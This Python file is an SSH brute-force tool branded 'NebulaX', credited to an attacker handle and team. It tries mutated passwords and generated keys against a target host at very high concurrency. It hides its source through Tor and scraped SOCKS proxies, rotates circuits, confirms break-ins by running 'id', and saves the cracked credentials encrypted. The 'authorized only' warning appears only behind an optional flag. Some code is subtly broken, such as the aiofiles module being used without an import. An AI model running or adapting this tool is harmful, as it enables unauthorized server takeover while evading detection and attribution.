import asyncio
import aiohttp
import asyncssh
import aiohttp_socks
import logging
import logging.handlers
import sys
import time
import random
import secrets
import pickle
import base64
import os
import signal
import psutil
import yaml
import argparse
import re
import string
import itertools
from pathlib import Path
from typing import List, Optional, Dict
from dataclasses import dataclass, field
from faker import Faker
from tqdm.asyncio import tqdm_asyncio
from aiohttp import ClientSession
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives.asymmetric import rsa, ec, ed25519
from cryptography.hazmat.primitives.serialization import Encoding, PrivateFormat, NoEncryption
from concurrent.futures import ThreadPoolExecutor
import uvloop
import aiomultiprocess
from colorama import Fore, Style, init

init(autoreset=True)

def print_banner():
    banner = f"""
{Fore.RED}[x] {Fore.WHITE}OPERATOR: {Fore.LIGHTBLACK_EX}[NoneR00tk1t]
{Fore.RED}[x] {Fore.WHITE}TEAM: {Fore.LIGHTBLACK_EX}[Valhala]
{Fore.LIGHTBLACK_EX}-------------------------------------
{Fore.RED}  ****           *   *
{Fore.RED} *  *************  **
{Fore.RED}*     *********    **
{Fore.RED}*     *  *         **
{Fore.RED} **  *  **         **
{Fore.RED}    *  ***         **  ***
{Fore.RED}   **   **         ** * ***
{Fore.RED}   **   **         ***   *
{Fore.RED}   **   **         **   *
{Fore.RED}   **   **         **  *
{Fore.RED}    **  **         ** **
{Fore.RED}     ** *      *   ******
{Fore.RED}      ***     *    **  ***
{Fore.RED}       *******     **   *** *
{Fore.RED}         ***        **   ***
{Fore.LIGHTBLACK_EX}-------------------------------------
{Style.RESET_ALL}"""
    print(banner)

asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

Path("logs").mkdir(exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.handlers.RotatingFileHandler(
            f'logs/nebulax_{int(time.time())}.log', maxBytes=50*1024*1024, backupCount=10
        ),
        logging.StreamHandler(sys.stdout)
    ]
)
log = logging.getLogger(__name__)

@dataclass
class Proxy:
    host: str
    port: int
    type: str = 'socks5'
    user: Optional[str] = None
    pwd: Optional[str] = None
    latency: float = 999.0
    fails: int = 0
    succ: int = 0
    last: float = 0.0

@dataclass
class Stats:
    att: int = 0
    succ: int = 0
    fail: int = 0
    err: int = 0
    start: float = field(default_factory=time.time)
    rate: float = 0.0
    cpu: float = 0.0
    mem: float = 0.0
    proxy_ok: int = 0
    proxy_ko: int = 0
    tor_ok: int = 0
    tor_ko: int = 0

class CircuitBreaker:
    def __init__(self, max_failures: int = 50, reset_timeout: int = 1800):
        self.max_failures = max_failures
        self.reset_timeout = reset_timeout
        self.failures = 0
        self.last_failure = 0
        self.state = "CLOSED"
        self.lock = asyncio.Lock()

    async def execute(self, coro):
        async with self.lock:
            if self.state == "OPEN":
                if time.time() - self.last_failure > self.reset_timeout:
                    self.state = "HALF_OPEN"
                    self.failures = 0
                else:
                    raise RuntimeError("Circuit breaker open")
            if self.state == "HALF_OPEN":
                self.failures = 0

        try:
            result = await coro
            async with self.lock:
                if self.state == "HALF_OPEN":
                    self.state = "CLOSED"
            return result
        except Exception as e:
            async with self.lock:
                self.failures += 1
                self.last_failure = time.time()
                if self.failures >= self.max_failures:
                    self.state = "OPEN"
            raise e

class NebulaX:
    def __init__(self, host: str, port: int = 22, cfg: Dict = None):
        self.host = self._validate_host(host)
        self.port = port
        self.cfg = cfg or self._load_config()
        self.timeout = self.cfg['timeout']
        self.retries = self.cfg['retries']
        self.max_conn = self.cfg['max_conn']
        self.delay = self.cfg['delay']
        self.tor = self.cfg['tor']
        self.tor_port = self.cfg['tor_port']
        self.tor_ctrl = None
        self.proxies: List[Proxy] = []
        self.active = 0
        self.found = []
        self.stop = asyncio.Event()
        self.lock = asyncio.Semaphore(self.max_conn)
        self.stats = Stats()
        self.cipher = self._init_cipher()
        self.fake = Faker()
        self.success_patterns = []
        self.executor = ThreadPoolExecutor(max_workers=500)
        self.circuit = CircuitBreaker()
        self.mutators = self._get_mutators()
        self.key_types = ['rsa', 'ecdsa', 'ed25519']
        if self.tor:
            asyncio.create_task(self._tor_init())

    def _load_config(self) -> Dict:
        defaults = {
            'timeout': 2, 'retries': 10, 'max_conn': 15000, 'delay': 0.0005,
            'tor': True, 'tor_port': 9050, 'keys': 5000, 'batch': 1000,
            'min_pass': 3, 'proxy_int': 10, 'max_attempts': 10_000_000
        }
        try:
            with open("nebulax.yaml", "r") as f:
                user_cfg = yaml.safe_load(f) or {}
            return {**defaults, **user_cfg}
        except:
            return defaults

    def _validate_host(self, host: str) -> str:
        import socket
        try: socket.gethostbyname(host)
        except: raise ValueError("Invalid host")
        return host

    def _init_cipher(self):
        kfile = Path("nebulax.key")
        if kfile.exists(): return Fernet(kfile.read_bytes())
        k = base64.urlsafe_b64encode(PBKDF2HMAC(
            algorithm=hashes.SHA3_512(), length=256, salt=os.urandom(512), iterations=8_000_000
        ).derive(os.urandom(2048)))
        kfile.write_bytes(k)
        return Fernet(k)

    def _get_mutators(self):
        return [
            lambda p: p + str(random.randint(1000,9999999)),
            lambda p: p.capitalize() + random.choice(['!','@','#','$','%','&','*','^']),
            lambda p: ''.join(c if random.random() > 0.05 else random.choice(['@','0','1','!','_','-','*','^']) for c in p),
            lambda p: p + str(time.localtime().tm_year),
            lambda p: f"N{p}{random.randint(100,999999)}",
            lambda p: p[::-1] + random.choice(['_','.','-','*','@','!','^']),
            lambda p: ''.join(random.choice([c.upper(), c.lower()]) for c in p),
            lambda p: p + secrets.token_hex(5),
            lambda p: f"{p[0].upper()}{p[1:-1]}{p[-1].upper()}",
            lambda p: self._ai_mutate(p, len(p))
        ]

    def _ai_mutate(self, p: str, length: int) -> str:
        if not self.success_patterns: return p
        base = random.choice(self.success_patterns[-10:])
        mix = base[:length//2] + p + base[length//2:]
        return ''.join(c for c in mix if c in string.printable)[:20]

    async def _tor_init(self):
        try:
            from stem.control import Controller
            self.tor_ctrl = Controller.from_port(port=9051)
            self.tor_ctrl.authenticate()
            log.info("Tor: Online")
        except:
            self.tor = False
            log.warning("Tor: Offline")

    async def load_proxies(self, file: str):
        for line in Path(file).read_text(encoding='utf-8', errors='ignore').splitlines():
            m = re.match(r'(\S+):(\d+)(?::(\w+))?(?::(\S+))?(?::(\S+))?', line.strip())
            if m: self.proxies.append(Proxy(m[1], int(m[2]), m[3] or 'socks5', m[4], m[5]))
        await self._check_proxies()

    async def _check_proxies(self):
        async def test(p: Proxy):
            try:
                url = f"{p.type}://{p.user+':'+p.pwd+'@' if p.user else ''}{p.host}:{p.port}"
                async with ClientSession(connector=aiohttp_socks.ProxyConnector.from_url(url)) as s:
                    t0 = time.time()
                    async with s.get('http://httpbin.org/ip', timeout=1) as r:
                        if r.status == 200:
                            p.latency = time.time() - t0
                            p.succ += 1
                            p.last = time.time()
                            self.stats.proxy_ok += 1
                            return True
            except:
                p.fails += 1
                self.stats.proxy_ko += 1
            return False
        await asyncio.gather(*[test(p) for p in self.proxies], return_exceptions=True)
        self.proxies = [p for p in self.proxies if p.fails < 3 and p.latency < 1.0]

    async def _get_proxy_command(self) -> Optional[str]:
        if self.tor and random.random() < 0.95:
            if self.tor_ctrl and random.random() < 0.1:
                try: self.tor_ctrl.signal('NEWCIRCUIT')
                except: pass
            self.stats.tor_ok += 1
            return f"nc -X 5 -x 127.0.0.1:{self.tor_port} %h %p"
        if self.proxies:
            good = [p for p in self.proxies if p.fails < 3 and p.succ > 0]
            if good:
                p = random.choices(good, weights=[1/(p.latency+0.001) for p in good])[0]
                return f"nc -X 5 -x {p.host}:{p.port} %h %p"
        return None

    async def _test_conn(self) -> bool:
        for _ in range(self.retries):
            proxy_cmd = await self._get_proxy_command()
            try:
                async with asyncssh.connect(
                    self.host, self.port, known_hosts=None,
                    connect_timeout=self.timeout,
                    proxy_command=proxy_cmd
                ):
                    return True
            except:
                await asyncio.sleep(0.5)
        return False

    async def _gen_key(self, ktype: str):
        loop = asyncio.get_running_loop()
        if ktype == 'rsa':
            k = await loop.run_in_executor(self.executor, lambda: rsa.generate_private_key(65537, 4096))
        elif ktype == 'ecdsa':
            k = await loop.run_in_executor(self.executor, lambda: ec.generate_private_key(ec.SECP384R1()))
        elif ktype == 'ed25519':
            k = await loop.run_in_executor(self.executor, lambda: ed25519.Ed25519PrivateKey.generate())
        else:
            return None
        return k.private_bytes(Encoding.PEM, PrivateFormat.PKCS8, NoEncryption())

    async def connect(self, user: str, cred: str | bytes) -> bool:
        async with self.lock:
            if self.stats.att >= self.cfg['max_attempts']:
                self.stop.set()
                return False
            self.active += 1
            self.stats.att += 1
            tfile = None
            try:
                proxy_cmd = await self._get_proxy_command()
                kwargs = {
                    'host': self.host, 'port': self.port, 'username': user,
                    'connect_timeout': self.timeout, 'known_hosts': None,
                    'proxy_command': proxy_cmd
                }
                if isinstance(cred, str):
                    kwargs['password'] = cred
                else:
                    tfile = Path(f"tmp_{secrets.token_hex(8)}.key")
                    tfile.write_bytes(cred)
                    kwargs['client_keys'] = [str(tfile)]
                async with self.circuit.execute(asyncssh.connect(**kwargs)) as conn:
                    res = await conn.run('id', check=True)
                    if user in res.stdout:
                        enc = self.cipher.encrypt(
                            f"{user}:{'[KEY]' if isinstance(cred,bytes) else cred}:{time.time()}:{self.fake.user_agent()}".encode()
                        ).decode()
                        self.found.append(enc)
                        self.stats.succ += 1
                        if isinstance(cred, str): self.success_patterns.append(cred)
                        log.info(f"[+] HIT: {user}:{'[KEY]' if isinstance(cred,bytes) else '[PASS]'}")
                        await self._save()
                        return True
            except asyncssh.PermissionDenied:
                self.stats.fail += 1
            except:
                self.stats.err += 1
            finally:
                self.active -= 1
                if tfile and tfile.exists(): tfile.unlink(missing_ok=True)
            return False

    async def _save(self):
        try:
            async with aiofiles.open("nebulax_cache.pkl", "wb") as f:
                await f.write(self.cipher.encrypt(pickle.dumps({
                    'found': self.found, 'stats': vars(self.stats),
                    'proxies': [(p.host, p.port, p.type, p.user, p.pwd, p.latency, p.fails, p.succ) for p in self.proxies],
                    'patterns': self.success_patterns
                })))
        except: pass

    async def _load(self):
        p = Path("nebulax_cache.pkl")
        if p.exists():
            try:
                async with aiofiles.open(p, "rb") as f:
                    d = pickle.loads(self.cipher.decrypt(await f.read()))
                    self.found = d.get('found', [])
                    self.success_patterns = d.get('patterns', [])
                    for k, v in d.get('stats', {}).items(): setattr(self.stats, k, v)
                    self.proxies = [Proxy(*p[:5], p[5], p[6], p[7]) for p in d.get('proxies', [])]
                log.info("Cache loaded")
            except: pass

    async def _monitor(self):
        while not self.stop.is_set():
            self.stats.cpu = psutil.cpu_percent()
            self.stats.mem = psutil.virtual_memory().percent
            self.stats.rate = self.stats.att / max(1, time.time() - self.stats.start)
            if self.stats.cpu > 98 or self.stats.mem > 98:
                log.warning("Overload - Cooling down")
                await asyncio.sleep(30)
            await asyncio.sleep(0.5)

    async def _proxy_maint(self):
        while not self.stop.is_set():
            await self._check_proxies()
            if len(self.proxies) < 100:
                await self._scrape_proxies()
            await asyncio.sleep(self.cfg['proxy_int'])

    async def _scrape_proxies(self):
        urls = [
            'https://www.proxy-list.download/api/v1/get?type=socks5',
            'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5',
        ]
        async with ClientSession() as s:
            for url in urls:
                try:
                    async with s.get(url, timeout=3) as r:
                        for m in re.findall(r'(\d+\.\d+\.\d+\.\d+):(\d+)', await r.text()):
                            self.proxies.append(Proxy(m[0], int(m[1])))
                except: pass
        await self._check_proxies()

    def _generate_passwords(self) -> List[str]:
        base = ['admin', 'root', 'test', 'guest', self.host.split('.')[0]]
        chars = string.ascii_letters + string.digits + '!@#$%^&*_-'
        passwords = set(base)
        for length in range(self.cfg['min_pass'], 13):
            for combo in itertools.islice(itertools.product(chars, repeat=length), 500):
                passwords.add(''.join(combo))
        return list(passwords)[:15000]

    async def attack(self, users: List[str], passes: List[str], keys: bool = False):
        if not await self._test_conn(): return
        await self._load()
        if self.proxies: asyncio.create_task(self._proxy_maint())
        asyncio.create_task(self._monitor())

        creds = []
        if not passes:
            passes = self._generate_passwords()
        for p in passes:
            creds.extend([m(p) for m in self.mutators])
        creds = list(set(creds))[:self.cfg['max_attempts']]

        if keys:
            tasks = [self._gen_key(kt) for kt in self.key_types for _ in range(self.cfg['keys'] // 3)]
            creds.extend([k for k in await asyncio.gather(*tasks) if k])

        random.shuffle(creds)
        tasks = [(u, c) for u in users for c in creds]

        async def worker(chunk):
            return await asyncio.gather(*(self.connect(u, c) for u, c in chunk), return_exceptions=True)

        with aiomultiprocess.Pool(processes=12) as pool:
            for i in tqdm_asyncio(range(0, len(tasks), self.cfg['batch']), desc="NebulaX", unit="batch"):
                if self.stop.is_set(): break
                chunk = tasks[i:i+self.cfg['batch']]
                await pool.apply(worker, (chunk,))
                await asyncio.sleep(self.delay + random.uniform(0, 0.001))
        await self._export()

    async def _export(self):
        out = {
            'target': f"{self.host}:{self.port}",
            'stats': vars(self.stats),
            'creds': [
                {'user': c.split(':')[0], 'cred': '[REDACTED]', 'time': c.split(':')[2]}
                for c in (self.cipher.decrypt(b.encode()).decode() for b in self.found)
            ]
        }
        async with aiofiles.open("nebulax_results.yaml", "w") as f:
            await f.write(yaml.safe_dump(out))
        log.info(f"Results: {len(self.found)} hits")

# === MAIN ===
async def main():
    print_banner()

    p = argparse.ArgumentParser(
        description="NebulaX - Ultimate SSH Bruteforce Engine",
        epilog="Use only in authorized environments with written permission!"
    )
    p.add_argument("host", help="Target host")
    p.add_argument("-p", "--port", type=int, default=22)
    p.add_argument("-u", "--user")
    p.add_argument("-U", "--ulist")
    p.add_argument("-P", "--pass", action="append", default=[])
    p.add_argument("-W", "--wlist")
    p.add_argument("--proxy")
    p.add_argument("--tor", action="store_true")
    p.add_argument("--keys", action="store_true")
    p.add_argument("--confirm", action="store_true", help="Require confirmation")

    args = p.parse_args()

    if args.confirm:
        print(f"{Fore.YELLOW}[!] WARNING: This tool is for AUTHORIZED penetration testing only.")
        if input(f"{Fore.CYAN}Type 'YES' to continue: ").strip() != "YES":
            sys.exit(0)

    cfg = {
        'timeout': 2, 'retries': 10, 'max_conn': 15000, 'delay': 0.0005,
        'tor': args.tor, 'tor_port': 9050, 'keys': 5000, 'batch': 1000
    }
    nx = NebulaX(args.host, args.port, cfg)
    if args.proxy: await nx.load_proxies(args.proxy)

    users = [args.user] if args.user else load_list(args.ulist or "")
    passes = args.pass + (load_list(args.wlist or "") if args.wlist else [])
    await nx.attack(users, passes, args.keys)

def load_list(file: str) -> List[str]:
    p = Path(file)
    return [l.strip() for l in p.read_text(encoding='utf-8', errors='ignore').splitlines() if l.strip()] if p.exists() else []

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Stopped by user")
    finally:
        print(f"{Fore.CYAN}[*] NebulaX shutdown")